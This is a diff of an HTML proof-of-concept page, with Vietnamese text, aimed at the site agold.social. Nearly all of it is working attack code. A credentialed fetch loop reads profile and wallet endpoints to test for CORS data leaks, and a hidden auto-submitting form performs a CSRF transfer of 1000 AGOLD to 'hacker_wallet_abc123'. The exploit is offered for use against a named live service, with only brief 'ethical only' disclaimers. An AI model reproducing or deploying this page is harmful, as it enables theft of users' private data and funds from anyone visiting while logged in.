@@ -1,73 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Agold.social - CORS & CSRF Exploit PoC</title>
+  <title>Agold.social - CORS + CSRF Full PoC</title>
   <style>
-    body { font-family: Arial; text-align: center; margin: 50px; }
-    button { padding: 10px 20px; margin: 10px; background: #d32f2f; color: white; border: none; cursor: pointer; }
-    button:hover { background: #b71c1c; }
-    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; max-width: 80%; }
+    body { font-family: Arial; text-align: center; margin: 20px; background: #f0f0f0; }
     h1 { color: #d32f2f; }
-    .warning { color: red; font-weight: bold; }
+    .test-btn { padding: 10px 20px; margin: 10px; background: #2196F3; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    .csrf-btn { background: #f44336 !important; }
+    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; max-width: 80%; margin: 10px; }
+    .status-safe { color: green; }
+    .status-vuln { color: red; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <h1 class="warning">Agold.social Exploit Demo (Ethical Testing ONLY)</h1>
-  <p><small>Đăng nhập <code>agold.social</code> ở tab khác trước khi test!</small></p>
+  <h1>🔥 Agold.social - CORS & CSRF Exploit Tester</h1>
+  <p><b>Hướng dẫn:</b> Mở <b>Tab 1</b>: Đăng nhập agold.social → <b>Tab 2</b>: Trang này → Click test</p>
 
-  <!-- CORS Tests -->
-  <h2>1. Test CORS (Leak Data)</h2>
-  <button onclick="testCORS('/user/wallet')">Test Wallet Balance</button>
-  <button onclick="testCORS('/user/wallet/transaction-history')">Test Transaction History</button>
+  <h2>🛡️ Test CORS (Lấy profile/wallet)</h2>
+  <button class="test-btn" onclick="testEndpoints()">Test All Endpoints</button>
   <pre id="corsResult">Click để test...</pre>
 
-  <!-- CSRF Tests -->
-  <h2>2. Test CSRF (Transfer Token)</h2>
-  <p class="warning">Nút dưới sẽ chuyển 100 AGOLD đến hacker_wallet nếu vuln!</p>
-  <button onclick="testCSRF()">EXPLOIT: Chuyển 100 AGOLD</button>
+  <h2>💥 Test CSRF (Chuyển tiền giả lập)</h2>
+  <p>Click để gửi form POST (nếu lỗ hổng CSRF → tiền bị chuyển!)</p>
+  <button class="test-btn csrf-btn" onclick="testCSRF()">Exploit CSRF: Chuyển 1000 AGOLD</button>
+  <form id="csrfForm" class="hidden" method="POST" action="https://gateway.agold.social/api/v1/transfer">
+    <input type="hidden" name="to" value="hacker_wallet_abc123">
+    <input type="hidden" name="amount" value="1000">
+  </form>
 
   <script>
-    // CORS Test Function
-    async function testCORS(endpoint) {
-      const url = `https://gateway.agold.social${endpoint}`;
-      const resultEl = document.getElementById('corsResult');
-      resultEl.textContent = `Testing ${url}...\n`;
+    const endpoints = [
+      '/api/v1/user/profile',
+      '/api/v1/wallet/balance',
+      '/api/v1/user/info',
+      '/api/user'
+    ];
 
-      try {
-        const res = await fetch(url, {
-          method: 'GET',
-          credentials: 'include'  // Gửi cookie session
-        });
-        resultEl.textContent += `Status: ${res.status}\n`;
-        resultEl.textContent += `CORS Headers: ${JSON.stringify([...res.headers.entries()])}`;
-
-        if (res.ok) {
-          const data = await res.json();
-          resultEl.textContent += `\nSUCCESS! Data Leaked:\n${JSON.stringify(data, null, 2)}`;
-          alert('🚨 CORS VULN! Dữ liệu bị leak!');
+    async function testEndpoints() {
+      const result = document.getElementById('corsResult');
+      result.textContent = 'Testing...\n\n';
+      
+      for (let path of endpoints) {
+        try {
+          const res = await fetch(`https://gateway.agold.social${path}`, {
+            method: 'GET',
+            credentials: 'include'  // Gửi cookie nếu login
+          });
+          if (res.ok && res.headers.get('access-control-allow-origin')) {
+            const data = await res.text();
+            result.textContent += `✅ VULN: ${path}\nStatus: ${res.status}\nData: ${data.substring(0, 200)}...\n\n`;
+            result.className = 'status-vuln';
+          } else {
+            result.textContent += `🚫 SAFE: ${path} (CORS Blocked)\nStatus: ${res.status}\n\n`;
+          }
+        } catch (err) {
+          result.textContent += `🚫 SAFE: ${path} (Failed to fetch - CORS Blocked)\nError: ${err.message}\n\n`;
         }
-      } catch (err) {
-        resultEl.textContent += `Error: ${err.message}\n(CORS Blocked - An toàn!)`;
       }
     }
 
-    // CSRF Test Function
     function testCSRF() {
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'https://gateway.agold.social/admin/wallet/transfer';
-      form.innerHTML = `
-        <input type="hidden" name="to" value="hacker_wallet_123">
-        <input type="hidden" name="amount" value="100">
-        <input type="hidden" name="token" value="AGOLD">
-      `;
-      document.body.appendChild(form);
-      form.submit();
-      alert('CSRF Triggered! Check ví agold.social...');
+      alert('🚨 CSRF EXPLOIT: Đang gửi yêu cầu chuyển 1000 AGOLD đến hacker!');
+      document.getElementById('csrfForm').submit();
     }
   </script>
-
   <hr>
-  <p class="warning">Ethical only! Report vuln to agold.social if found.</p>
+  <p><small>PoC ethical only. Report nếu tìm thấy vuln!</small></p>
 </body>
 </html>
